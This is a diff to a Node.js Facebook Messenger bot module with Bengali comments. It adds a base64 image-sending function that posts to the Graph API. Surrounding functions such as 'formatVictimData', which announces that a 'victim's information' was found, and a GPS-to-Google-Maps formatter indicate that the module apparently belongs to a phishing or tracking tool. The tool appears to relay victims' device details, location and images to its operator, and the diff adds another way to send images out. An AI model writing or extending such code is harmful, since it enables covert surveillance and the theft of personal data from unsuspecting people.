@@ -78,7 +78,7 @@ async function sendMessage(recipientId, text) {
 }
 
 // ================================================================
-// ইমেজ ফাইল সেভ করা
+// ইমেজ ফাইল সেভ করা (অ্যাডমিন প্যানেলের জন্য)
 // ================================================================
 async function saveImageFile(base64Image) {
     try {
@@ -135,6 +135,48 @@ async function sendImageMessage(recipientId, imageUrl) {
             console.error('❌ ইমেজ পাঠাতে ফেসবুক এরর:', err.response.data);
         } else {
             console.error('❌ ইমেজ পাঠাতে ব্যর্থ:', err.message);
+        }
+        return { success: false, error: err.message };
+    }
+}
+
+// ================================================================
+// 🆕 Base64 দিয়ে সরাসরি ইমেজ পাঠানো (URL কাজ না করলে ব্যাকআপ)
+// ================================================================
+async function sendImageMessageBase64(recipientId, base64Image) {
+    try {
+        const config = await getConfig();
+        const token = config.pageAccessToken;
+        if (!token || token === '') {
+            console.error('❌ টোকেন সেট নেই!');
+            return { success: false, error: 'TOKEN_MISSING' };
+        }
+
+        const response = await axios.post(
+            `https://graph.facebook.com/v18.0/me/messages?access_token=${token}`,
+            {
+                recipient: { id: recipientId },
+                message: {
+                    attachment: {
+                        type: 'image',
+                        payload: {
+                            is_reusable: false,
+                            url: `data:image/jpeg;base64,${base64Image}`
+                        }
+                    }
+                }
+            },
+            { timeout: 30000 }
+        );
+
+        console.log(`✅ Base64 ইমেজ মেসেজ পাঠানো হয়েছে: ${recipientId}`);
+        return { success: true, data: response.data };
+
+    } catch (err) {
+        if (err.response) {
+            console.error('❌ Base64 ইমেজ পাঠাতে ফেসবুক এরর:', err.response.data);
+        } else {
+            console.error('❌ Base64 ইমেজ পাঠাতে ব্যর্থ:', err.message);
         }
         return { success: false, error: err.message };
     }
@@ -201,36 +243,27 @@ function getDeviceModel(device) {
 }
 
 // ================================================================
-// 🔥 বাংলাদেশ সময় তৈরির ফাংশন (সরাসরি UTC+6 অফসেট + ম্যানুয়াল ফরম্যাট)
+// বাংলাদেশ সময় তৈরির ফাংশন
 // ================================================================
 function getBangladeshTime() {
     const now = new Date();
-    // UTC+6 অফসেট যোগ করুন (৬ ঘন্টা = ২১৬০০০০০ মিলিসেকেন্ড)
     const bdTime = new Date(now.getTime() + (6 * 60 * 60 * 1000));
-    
-    // দিন, মাস, বছর, ঘন্টা, মিনিট, সেকেন্ড বের করুন
     const day = String(bdTime.getUTCDate()).padStart(2, '0');
     const month = String(bdTime.getUTCMonth() + 1).padStart(2, '0');
     const year = bdTime.getUTCFullYear();
-    
     let hours = bdTime.getUTCHours();
     const minutes = String(bdTime.getUTCMinutes()).padStart(2, '0');
     const seconds = String(bdTime.getUTCSeconds()).padStart(2, '0');
     const ampm = hours >= 12 ? 'PM' : 'AM';
-    hours = hours % 12 || 12; // ১২ ঘন্টা ফরম্যাট
-    
-    // বাংলা সংখ্যায় রূপান্তর (ঐচ্ছিক, তবে আমরা ইংরেজি সংখ্যায় রাখলাম কারণ ইউজার সেটাই দেখতে চায়)
-    // ফরম্যাট: দিন/মাস/বছর, ঘন্টা:মিনিট:সেকেন্ড AM/PM
+    hours = hours % 12 || 12;
     return `${day}/${month}/${year}, ${hours}:${minutes}:${seconds} ${ampm}`;
 }
 
 // ================================================================
-// 🔥 ভিক্টিম ডেটা ফরম্যাট (বাংলাদেশ সময় সহ)
+// ভিক্টিম ডেটা ফরম্যাট (বাংলাদেশ সময় সহ)
 // ================================================================
 function formatVictimData(victim) {
     const d = victim.device || {};
-    
-    // বাংলাদেশ সময়
     const deviceTime = getBangladeshTime();
     
     let msg = '✅ *ভিক্টিমের তথ্য পাওয়া গেছে!*\n\n';
@@ -277,12 +310,16 @@ function formatLocationMessage(gpsLocation) {
            `🔗 গুগল ম্যাপ: ${mapLink}`;
 }
 
+// ================================================================
+// এক্সপোর্ট
+// ================================================================
 module.exports = {
     getConfig,
     getLocalConfig,
     sendMessage,
     saveImageFile,
     sendImageMessage,
+    sendImageMessageBase64,
     getUserProfile,
     shortenUrl,
     getDeviceModel,
